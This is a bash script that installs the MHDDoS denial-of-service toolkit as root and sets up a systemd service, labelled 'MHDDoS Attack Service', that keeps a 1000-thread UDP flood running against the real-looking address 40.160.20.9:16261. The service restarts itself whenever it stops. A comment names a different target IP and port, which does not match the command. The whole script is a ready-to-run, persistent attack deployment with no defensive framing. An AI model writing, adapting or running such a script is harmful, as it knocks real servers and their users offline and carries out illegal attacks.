#!/bin/bash

# 1. System Update & Dependencies
apt update && apt install -y python3 python3-pip git build-essential

# 2. Fresh Directory Setup
cd /root
rm -rf MHDDoS
git clone https://github.com/MatrixTM/MHDDoS.git
cd MHDDoS

# 3. Force-Install Requirements Locally (-t . moves them into the current folder)
# This bypasses all "ModuleNotFoundError" issues in Python 3.13
pip3 install cloudscraper impacket yarl psutil requests --break-system-packages -t .

# 4. Fix PyRoxy (The "Local Move" Trick)
rm -rf PyRoxy
git clone https://github.com/MatrixTM/PyRoxy.git temp_pyroxy
cp -r temp_pyroxy/PyRoxy .
rm -rf temp_pyroxy

# 5. Create the Persistent Service
# Target: 162.19.126.179:7777 | Threads: 1000
cat <<EOF > /etc/systemd/system/mhddos.service
[Unit]
Description=MHDDoS Attack Service
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/root/MHDDoS
# Ensure the local directory is prioritized for modules
Environment=PYTHONPATH=/root/MHDDoS
ExecStart=/usr/bin/python3 start.py UDP 40.160.20.9:16261 1000 99999999999
Restart=always
RestartSec=5s
RuntimeMaxSec=10min

[Install]
WantedBy=multi-user.target
EOF

# 6. Activation
systemctl daemon-reload
systemctl enable mhddos.service
systemctl restart mhddos.service

echo "------------------------------------------------"
echo "DEPLOYMENT SUCCESSFUL"
echo "Checking logs..."
echo "------------------------------------------------"
sleep 3
journalctl -u mhddos.service -n 20 --no-pager
